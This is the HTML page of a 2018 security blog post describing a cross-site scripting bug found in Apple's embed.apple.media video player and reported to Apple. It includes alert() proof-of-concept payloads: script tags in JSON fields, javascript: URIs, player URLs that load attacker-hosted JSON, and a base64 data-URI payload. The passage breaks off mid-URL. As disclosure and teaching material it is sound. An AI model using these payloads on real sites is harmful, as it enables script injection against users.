@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.8.0">
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+
+    <!--Description-->
+    
+        <meta name="description" content="TL;DR - Follow Garyvee on Twitter, and you’ll probably find XSS. 
+
+IntroWhen you work a desk job, sometimes you need inspiration to ‘crush it’ and Gar">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="Lewis Ardern">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="Planet Of The XSS">
+    
+
+    <!--Open Graph Description-->
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="ardern.io">
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article">
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary">
+    
+
+    <!-- Title -->
+    
+    <title>Planet Of The XSS - ardern.io</title>
+
+    <!-- Tachyons Core CSS -->
+    <link rel="stylesheet" href="//unpkg.com/tachyons/css/tachyons.min.css">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<!-- Main Content -->
+<!-- Banner -->
+
+<!-- Banner -->
+<div class="w-100 bg-1 ph5-ns ph3 text-light">
+    
+    <nav class="db dt-l w-100 mw8 center border-box pv3">
+        <!-- <a class="db dtc-l v-mid link dim w-100 w-25-l tc tl-l mb2 mb0-l white" href="/" title="ardern.io">
+            <img src="" class="dib h3" alt="ardern.io">
+        </a>  -->
+        <a class="db dtc-l v-mid link dim w-100 w-25-l tc tl-l mb2 mb0-l white" href="/" title="ardern.io">      
+            ardern.io    
+        </a>
+        <div class="db dtc-l v-mid w-100 w-75-l tc tr-l">
+            
+                <a class="link dim f6 f5-l dib mr3 mr4-l white" href="/" title="Home">
+                    Home
+                </a>
+            
+                <a class="link dim f6 f5-l dib mr3 mr4-l white" href="/about" title="About">
+                    About
+                </a>
+            
+                <a class="link dim f6 f5-l dib mr3 mr4-l white" href="/content" title="Content">
+                    Content
+                </a>
+            
+                <a class="link dim f6 f5-l dib mr3 mr4-l white" href="/archives" title="Archives">
+                    Archives
+                </a>
+            
+        </div>
+    </nav>
+
+    <!-- Title -->
+    <div class="w-100 mw8 center vh-40 dt">
+        <div class="dtc v-mid white">
+            <h1 class="f1-l f2-m tc tc-m tl-ns">Planet Of The XSS</h1>
+            <p class="f4 fw3 pab-100px tc tc-m tl-ns">2018-02-23</p>
+        </div>
+    </div>
+
+    <!-- Icon -->
+    <div class="relative w-100 mw8 center white dn dn-m db-ns">
+        <i class="header-icon fa fa-unlock"></i>
+    </div>
+</div>
+
+
+    
+<!-- Content -->
+<div class="w-100 ph2 ph4-m ph5-l mv5 mv6-l">
+    <div class="content">
+        <div class="mw8 center">
+            <div class="cf">
+                <div class="fl w-100 w-70-l mw7 left fw3 lh-copy pr4-ns pr0-m post-content">
+                    <!-- Tags Vertical -->
+                    
+                        <div class="tags-container-vertical">
+                            <div class="tags-sub-container">
+                                <a class="fw3 ph1 dib" href="/tags/XSS/">#XSS</a> <a class="fw3 ph1 dib" href="/tags/Security/">#Security</a>
+                            </div>
+                        </div>
+                    
+
+                    <!-- Main Post Content -->
+                    <p>TL;DR - Follow Garyvee on Twitter, and you’ll probably find XSS. </p>
+<img src="/2018/02/23/Apple-XSS/hof.jpg" title="apple hof">
+<h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>When you work a desk job, sometimes you need inspiration to ‘crush it’ and <a href="https://twitter.com/garyvee" target="_blank" rel="noopener">Gary Vaynerchuk</a> is my go-to hero when it comes to trying to be more productive and push forward in my career, plus he had <a href="https://www.youtube.com/watch?v=Z2CZn966cUg" target="_blank" rel="noopener">Weshly Arms Legendary</a> as his intro for DailyVee, which I now listen to all the time. By procrastinating more on Twitter, I saw that Gary was going to be in <a href="https://planetoftheapps.com/en-us" target="_blank" rel="noopener">Planet Of The Apps</a>, and he recommended that everyone should check out the website. When you visit the site, it looks pretty average, and it is, a very basic promotional website with a trailer embedded.  </p>
+<img src="/2018/02/23/Apple-XSS/planet1.JPG" title="planet of the apps">
+<p>Like every normal person, whenever visiting a website, I always view the source; now by looking at the source, you could tell directly something funky is going on, <a href="https://planetoftheapps.com/en-us" target="_blank" rel="noopener">check out the source</a> if you want to figure it out on your own.</p>
+<p>When you look at the source, you see the following iFrame:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">allowfullscreen</span>=<span class="string">''</span> <span class="attr">frameborder</span>=<span class="string">'0'</span> <span class="attr">height</span>=<span class="string">'100%'</span> <span class="attr">scrolling</span>=<span class="string">'no'</span> <span class="attr">src</span>=<span class="string">'https://embed.apple.media/public/assets/player.html?id=59a0662a064b5400127610ba&amp;amp;src=https://embed.apple.media/public/embeds/59a0662a064b5400127610ba.json'</span></span></span><br><span class="line"><span class="tag">    <span class="attr">style</span>=<span class="string">'position: absolute; top: 0; left: 0; width: 100%; height: 100%;'</span> <span class="attr">width</span>=<span class="string">'100%'</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>It’s very strange to load a resource in an iFrame and then include the same origin with a JSON object through a .json resource.   </p>
+<p>From what I can grasp, <a href="http://embed.apple.media/" target="_blank" rel="noopener">embed.apple.media</a> is used by Apple to load videos for apple music, for example the <a href="https://embed.apple.media/public/assets/player.html?id=&amp;src=https://embed.apple.media/public/embeds/59a0662a064b5400127610ba.json" target="_blank" rel="noopener">Planet of the apps trailer</a>  and a trailer for <a href="http://embed.apple.media/public/assets/player.html?id=5930b25fae7426000c80c9b9&amp;src=http://embed.apple.media/public/embeds/5930b25fae7426000c80c9b9.json" target="_blank" rel="noopener">Future’s Coming Out Strong</a>. </p>
+<h1 id="Investigating"><a href="#Investigating" class="headerlink" title="Investigating"></a>Investigating</h1><p>Now when I first started to see if this was vulnerable to Cross-Site Scripting (XSS), I attempted to just inject the src parameter as a JavaScript URI and inject script tags to see if it would render in the HTML mark-up. </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://embed.apple.media/public/assets/player.html?id=&amp;src=javascript:alert(1)</span><br><span class="line">https://embed.apple.media/public/assets/player.html?id=&amp;src=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>That didn’t work, and it’s generally not that easy, so next I looked to see what was being rendered in the .json file, and as you could see it was metadata for rendering the video. </p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"lastUpdate"</span>: <span class="string">"2017-08-26T01:14:16.233Z"</span>,</span><br><span class="line">    <span class="attr">"killswitch"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">"id"</span>: <span class="string">"59a0662a064b5400127610ba"</span>,</span><br><span class="line">    <span class="attr">"alias"</span>: <span class="string">"POTA EN-US SUPER TEASE"</span>,</span><br><span class="line">    <span class="attr">"autoplay"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">"loop"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"enableInlinePlayback"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"transitionStyle"</span>: <span class="string">"slide"</span>,</span><br><span class="line">    <span class="attr">"speed"</span>: <span class="number">300</span>,</span><br><span class="line">    <span class="attr">"autoplaySpeed"</span>: <span class="number">10</span>,</span><br><span class="line">    <span class="attr">"aspectRatio"</span>: &#123;</span><br><span class="line">        <span class="attr">"_id"</span>: <span class="string">"59a0662a064b5400127610bb"</span>,</span><br><span class="line">        <span class="attr">"y"</span>: <span class="number">9</span>,</span><br><span class="line">        <span class="attr">"x"</span>: <span class="number">16</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"meta"</span>: &#123;</span><br><span class="line">        <span class="attr">"branding"</span>: &#123;</span><br><span class="line">            <span class="attr">"iconApple"</span>: <span class="string">"apple-music"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"tags"</span>: [</span><br><span class="line">            <span class="string">"pota"</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">"sharing"</span>: &#123;</span><br><span class="line">            <span class="attr">"campaignToken"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"affiliateToken"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"url"</span>: <span class="string">"http://itunes.com"</span>,</span><br><span class="line">            <span class="attr">"twitter"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"facebook"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"tumblr"</span>: <span class="literal">null</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"slides"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"id"</span>: <span class="string">"59a05cbd666e23000cf74d3d"</span>,</span><br><span class="line">            <span class="attr">"alias"</span>: <span class="string">"POTA16_2Min_Supertease_NoLogo_US_CA.mp4 - 08/25/2017, 10:22:05"</span>,</span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"video"</span>,</span><br><span class="line">            <span class="attr">"meta"</span>: &#123;</span><br><span class="line">                <span class="attr">"tags"</span>: [</span><br><span class="line">                    <span class="string">"pota"</span></span><br><span class="line">                ],</span><br><span class="line">                <span class="attr">"branding"</span>: &#123;</span><br><span class="line">                    <span class="attr">"hideApple"</span>: <span class="literal">false</span>,</span><br><span class="line">                    <span class="attr">"hidePartner"</span>: <span class="literal">false</span>,</span><br><span class="line">                    <span class="attr">"iconApple"</span>: <span class="string">"apple-music"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"title"</span>: <span class="string">"Planet of the Apps: Extended Trailer"</span>,</span><br><span class="line">                <span class="attr">"description"</span>: <span class="literal">null</span>,</span><br><span class="line">                <span class="attr">"sharing"</span>: &#123;</span><br><span class="line">                    <span class="attr">"campaignToken"</span>: <span class="literal">null</span>,</span><br><span class="line">                    <span class="attr">"affiliateToken"</span>: <span class="literal">null</span>,</span><br><span class="line">                    <span class="attr">"url"</span>: <span class="string">"http://apple.co/planet-of-the-apps"</span>,</span><br><span class="line">                    <span class="attr">"staticCTA"</span>: <span class="literal">null</span>,</span><br><span class="line">                    <span class="attr">"iconCTA"</span>: <span class="literal">null</span>,</span><br><span class="line">                    <span class="attr">"twitter"</span>: <span class="literal">null</span>,</span><br><span class="line">                    <span class="attr">"facebook"</span>: <span class="literal">null</span>,</span><br><span class="line">                    <span class="attr">"tumblr"</span>: <span class="literal">null</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"artwork"</span>: <span class="string">"https://embed.apple.media/public/transcodes/59a0cb5d064b5400127611d8/a7a1cd51-7c3e-47b4-a4da-a78df2dd00b0_f64f1d8a-1839-4d7d-b070-f56e3856ed5e_Screen-Shot-2017-08-25-at-60359-PM_1080.png"</span>,</span><br><span class="line">                <span class="attr">"duration"</span>: <span class="number">120.89</span>,</span><br><span class="line">                <span class="attr">"width"</span>: <span class="number">1920</span>,</span><br><span class="line">                <span class="attr">"height"</span>: <span class="number">1080</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"closedCaptions"</span>: [],</span><br><span class="line">            <span class="attr">"media"</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"mimeType"</span>: <span class="string">"application/vnd.apple.mpegurl"</span>,</span><br><span class="line">                    <span class="attr">"src"</span>: <span class="string">"https://embed.apple.media/public/transcodes/59a05bd7064b540012760f5a/3bec97ed-595f-49a4-aef2-5d4020db2498.m3u8"</span>,</span><br><span class="line">                    <span class="attr">"label"</span>: <span class="string">"m3u8-playlist"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"mimeType"</span>: <span class="string">"video/webm"</span>,</span><br><span class="line">                    <span class="attr">"src"</span>: <span class="string">"https://embed.apple.media/public/transcodes/59a05bd7064b540012760f5a/77e28370-8053-4faa-8c5c-4f72e3925647.webm"</span>,</span><br><span class="line">                    <span class="attr">"label"</span>: <span class="string">"webm"</span>,</span><br><span class="line">                    <span class="attr">"duration"</span>: <span class="number">120.89</span>,</span><br><span class="line">                    <span class="attr">"width"</span>: <span class="number">1920</span>,</span><br><span class="line">                    <span class="attr">"height"</span>: <span class="number">1080</span></span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"mimeType"</span>: <span class="string">"video/mp4"</span>,</span><br><span class="line">                    <span class="attr">"src"</span>: <span class="string">"https://embed.apple.media/public/transcodes/59a05bd7064b540012760f5a/cd58a3b8-21c1-4fbe-b1dd-7fc3f0df1828.mp4"</span>,</span><br><span class="line">                    <span class="attr">"label"</span>: <span class="string">"mp4 high"</span>,</span><br><span class="line">                    <span class="attr">"duration"</span>: <span class="number">120.96</span>,</span><br><span class="line">                    <span class="attr">"width"</span>: <span class="number">1920</span>,</span><br><span class="line">                    <span class="attr">"height"</span>: <span class="number">1080</span></span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>The next attack scenario would be, because it wasn’t accepting arbitrary HTML or JavaScript URIs, maybe I could host my own JSON object and have see how the page renders in the HTML mark-up or evaluated by JavaScript.</p>
+<p>So I initially used <a href="http://myjson.com/" target="_blank" rel="noopener">myjson.com</a> a simple website which hosts JSON objects, and hosted the same payload that was being included on embed.apple.media, this loaded fine. The only thing which needed to be the same was the ID in the query string and the ID in the JSON object so for <a href="https://api.myjson.com/bins/139m8d.json" target="_blank" rel="noopener">https://api.myjson.com/bins/139m8d.json</a> because the ID was set as javascript:alert(1) the ID had to be <a href="https://embed.apple.media/public/assets/player.html?id=javascript:alert(1)&amp;partner=Apple&amp;src=https://api.myjson.com/bins/139m8d.json" target="_blank" rel="noopener">https://embed.apple.media/public/assets/player.html?id=javascript:alert(1)&amp;partner=Apple&amp;src=https://api.myjson.com/bins/139m8d.json</a>.</p>
+<p>By manipulating values in the JSON object, I first included javascript URIs in values that may have been interpreted as such e.g the src, this did not work, so I started to move into and including script tags.</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"lastUpdate"</span>: <span class="string">"2017-02-21T21:47:15.922Z"</span>,</span><br><span class="line">    <span class="attr">"killswitch"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">"id"</span>: <span class="string">"58a25450bd109a0012ecb3a5"</span>,</span><br><span class="line">    <span class="attr">"alias"</span>: <span class="string">"PTA"</span>,</span><br><span class="line">    <span class="attr">"autoplay"</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">"loop"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"enableInlinePlayback"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"transitionStyle"</span>: <span class="string">"slide"</span>,</span><br><span class="line">    <span class="attr">"speed"</span>: <span class="number">300</span>,</span><br><span class="line">    <span class="attr">"autoplaySpeed"</span>: <span class="number">10</span>,</span><br><span class="line">    <span class="attr">"aspectRatio"</span>: &#123;</span><br><span class="line">        <span class="attr">"_id"</span>: <span class="string">"58a25450bd109a0012ecb3a6"</span>,</span><br><span class="line">        <span class="attr">"y"</span>: <span class="number">9</span>,</span><br><span class="line">        <span class="attr">"x"</span>: <span class="number">16</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"meta"</span>: &#123;</span><br><span class="line">        <span class="attr">"branding"</span>: &#123;</span><br><span class="line">            <span class="attr">"iconApple"</span>: <span class="string">"apple-music"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"tags"</span>: [],</span><br><span class="line">        <span class="attr">"sharing"</span>: &#123;</span><br><span class="line">            <span class="attr">"campaignToken"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"affiliateToken"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"url"</span>: <span class="string">"http://itunes.com"</span>,</span><br><span class="line">            <span class="attr">"twitter"</span>: <span class="string">"#PlanetOfTheApps"</span>,</span><br><span class="line">            <span class="attr">"facebook"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"tumblr"</span>: <span class="string">"#PlanetOfTheApps"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"slides"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"id"</span>: <span class="string">"58a5d25ead20e900124409d3"</span>,</span><br><span class="line">            <span class="attr">"alias"</span>: <span class="string">"\u003cscript\u003ealert(1)\u003c/script\u003e"</span>,</span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"video"</span>,</span><br><span class="line">            <span class="attr">"meta"</span>: &#123;</span><br><span class="line">                <span class="attr">"tags"</span>: [</span><br><span class="line">                    <span class="string">"planetoftheapps"</span></span><br><span class="line">                ],</span><br><span class="line">                <span class="attr">"branding"</span>: &#123;</span><br><span class="line">                    <span class="attr">"hideApple"</span>: <span class="literal">false</span>,</span><br><span class="line">                    <span class="attr">"hidePartner"</span>: <span class="literal">false</span>,</span><br><span class="line">                    <span class="attr">"iconApple"</span>: <span class="string">"apple-music"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"title"</span>: <span class="string">"\u003cscript\u003ealert(1)\u003c/script\u003e"</span>,</span><br><span class="line">                <span class="attr">"description"</span>: <span class="literal">null</span>,</span><br><span class="line">                <span class="attr">"sharing"</span>: &#123;</span><br><span class="line">                    <span class="attr">"campaignToken"</span>: <span class="literal">null</span>,</span><br><span class="line">                    <span class="attr">"affiliateToken"</span>: <span class="literal">null</span>,</span><br><span class="line">                    <span class="attr">"url"</span>: <span class="string">"javascript:alert(1)"</span>,</span><br><span class="line">                    <span class="attr">"staticCTA"</span>: <span class="literal">null</span>,</span><br><span class="line">                    <span class="attr">"iconCTA"</span>: <span class="literal">null</span>,</span><br><span class="line">                    <span class="attr">"twitter"</span>: <span class="string">"#PlanetOfTheApps"</span>,</span><br><span class="line">                    <span class="attr">"facebook"</span>: <span class="literal">null</span>,</span><br><span class="line">                    <span class="attr">"tumblr"</span>: <span class="string">"#PlanetOfTheApps"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">"artwork"</span>: <span class="string">"https://embed.apple.media/public/transcodes/58a5d5c827e491000c1faf5f/668cc1ab-29b6-41ea-85af-2994b8f351e2_308a2d43-2cca-4074-99e5-538a5e80216d_posterframe_1080.png"</span>,</span><br><span class="line">                <span class="attr">"duration"</span>: <span class="number">148.452</span>,</span><br><span class="line">                <span class="attr">"width"</span>: <span class="number">1920</span>,</span><br><span class="line">                <span class="attr">"height"</span>: <span class="number">1080</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">"media"</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"mimeType"</span>: <span class="string">"text/html"</span>,</span><br><span class="line">                    <span class="attr">"src"</span>: <span class="string">"javascript:alert(1)"</span>,</span><br><span class="line">                    <span class="attr">"label"</span>: <span class="string">"m3u8-playlist"</span></span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"mimeType"</span>: <span class="string">"text/html"</span>,</span><br><span class="line">                    <span class="attr">"src"</span>: <span class="string">"javascript:alert(1)"</span>,</span><br><span class="line">                    <span class="attr">"label"</span>: <span class="string">"webm"</span>,</span><br><span class="line">                    <span class="attr">"duration"</span>: <span class="number">148.452</span>,</span><br><span class="line">                    <span class="attr">"width"</span>: <span class="number">1920</span>,</span><br><span class="line">                    <span class="attr">"height"</span>: <span class="number">1080</span></span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"mimeType"</span>: <span class="string">"text/html"</span>,</span><br><span class="line">                    <span class="attr">"src"</span>: <span class="string">"javascript:alert(1)"</span>,</span><br><span class="line">                    <span class="attr">"label"</span>: <span class="string">"mp4 high"</span>,</span><br><span class="line">                    <span class="attr">"duration"</span>: <span class="number">148.522</span>,</span><br><span class="line">                    <span class="attr">"width"</span>: <span class="number">1920</span>,</span><br><span class="line">                    <span class="attr">"height"</span>: <span class="number">1080</span></span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"mimeType"</span>: <span class="string">"text/html"</span>,</span><br><span class="line">                    <span class="attr">"src"</span>: <span class="string">"javascript:alert(1)"</span>,</span><br><span class="line">                    <span class="attr">"label"</span>: <span class="string">"ogg"</span>,</span><br><span class="line">                    <span class="attr">"duration"</span>: <span class="number">148.448</span>,</span><br><span class="line">                    <span class="attr">"width"</span>: <span class="number">1920</span>,</span><br><span class="line">                    <span class="attr">"height"</span>: <span class="number">1080</span></span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>And finally, after manipulating it enough, I got my XSS in the “title” field.</p>
+<p>So I had about 15 minutes until I was joining a friend to watch a film, so I wrote up a quick and dirty email and fired it over to product-security@apple.com</p>
+<img src="/2018/02/23/Apple-XSS/xss1.jpg" title="xss1">
+<h1 id="Final-Tip"><a href="#Final-Tip" class="headerlink" title="Final Tip"></a>Final Tip</h1><p>Something I learnt from this, <a href="https://twitter.com/insertscript" target="_blank" rel="noopener">h/t Alex</a> you don’t always have to excessively load from an external resource.</p>
+<p>You can use <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URIs" target="_blank" rel="noopener">Data URIs</a> to load resources in the same way.</p>
+<p>The format, of DataURIs is data: mediatype ; base64 , data,</p>
+<p>So in this case, you can include a Data URI of media/type application/json, with the base64 encoded data which can be interpreted as <a href="https://embed.apple.media/public/assets/player.html?id=58a25450bd109a0012ecb3a5&amp;partner=Apple&amp;src=data:application/json;base64,DATA" target="_blank" rel="noopener">https://embed.apple.media/public/assets/player.html?id=58a25450bd109a0012ecb3a5&amp;partner=Apple&amp;src=data:application/json;base64,DATA</a>. </p>
+<p>So if you have a JSON object, you can simply base64 encode it and include it in a Data URI, and your payload becomes <a href="https://embed.apple.media/public/assets/player.html?id=58a25450bd109a0012ecb3a5&amp;partner=Apple&amp;src=data:application/json;base64,eyJsYXN0VXBkYXRlIjoiMjAxNy0wMi0yMVQyMTo0NzoxNS45MjJaIiwia2lsbHN3aXRjaCI6ZmFsc2UsImlkIjoiNThhMjU0NTBiZDEwOWEwMDEyZWNiM2E1IiwiYWxpYXMiOiJQVEEiLCJhdXRvcGxheSI6ZmFsc2UsImxvb3AiOnRydWUsImVuYWJsZUlubGluZVBsYXliYWNrIjp0cnVlLCJ0cmFuc2l0aW9uU3R5bGUiOiJzbGlkZSIsInNwZWVkIjozMDAsImF1dG9wbGF5U3BlZWQiOjEwLCJhc3BlY3RSYXRpbyI6eyJfaWQiOiI1OGEyNTQ1MGJkMTA5YTAwMTJlY2IzYTYiLCJ5Ijo5LCJ4IjoxNn0sIm1ldGEiOnsiYnJhbmRpbmciOnsiaWNvbkFwcGxlIjoiYXBwbGUtbXVzaWMifSwidGFncyI6W10sInNoYXJpbmciOnsiY2FtcGFpZ25Ub2tlbiI6bnVsbCwiYWZmaWxpYXRlVG9rZW4iOm51bGwsInVybCI6Imh0dHA6Ly9pdHVuZXMuY29tIiwidHdpdHRlciI6IiNQbGFuZXRPZlRoZUFwcHMiLCJmYWNlYm9vayI6bnVsbCwidHVtYmxyIjoiI1BsYW5ldE9mVGhlQXBwcyJ9fSwic2xpZGVzIjpbeyJpZCI6IjU4YTVkMjVlYWQyMGU5MDAxMjQ0MDlkMyIsImFsaWFzIjoiXHUwMDNjc2NyaXB0XHUwMDNlYWxlcnQoMTMzNylcdTAwM2Mvc2NyaXB0XHUwMDNlIiwidHlwZSI6InZpZGVvIiwibWV0YSI6eyJ0YWdzIjpbInBsYW5ldG9mdGhlYXBwcyJdLCJicmFuZGluZyI6eyJoaWRlQXBwbGUiOmZhbHNlLCJoaWRlUGFydG5lciI6ZmFsc2UsImljb25BcHBsZSI6ImFwcGxlLW11c2ljIn0sInRpdGxlIjoiXHUwMDNjc2NyaXB0XHUwMDNlYWxlcnQoZG9jdW1lbnQuZG9tYWluKVx1MDAzYy9zY3JpcHRcdTAwM2UiLCJkZXNjcmlwdGlvbiI6bnVsbCwic2hhcmluZyI6eyJjYW1wYWlnblRva2VuIjpudWxsLCJhZmZpbGlhdGVUb2tlbiI6bnVsbCwidXJsIjoiamF2Y